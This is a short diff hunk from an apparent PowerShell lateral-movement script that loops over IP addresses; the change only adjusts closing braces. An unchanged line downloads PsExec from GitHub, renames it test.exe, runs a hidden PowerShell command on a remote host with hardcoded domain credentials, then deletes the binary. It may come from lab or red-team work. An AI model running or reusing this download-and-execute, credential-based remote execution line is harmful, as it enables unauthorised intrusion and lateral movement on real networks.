@@ -156,5 +156,6 @@ foreach ($ip in $ipAddresses) {
             Write-Host "Attempting SMB remoting to $targetIP"
 
             iwr https://github.com/EliteLoser/Invoke-PsExec/raw/refs/heads/master/PsExec.exe -Outfile test.exe; .\test.exe \\10.10.0.5 -u duck\gilcol -p P@ssw0rd -accepteula powershell -nop -c $cmd ; del test.exe
-    }
+    	}
+	}
 }
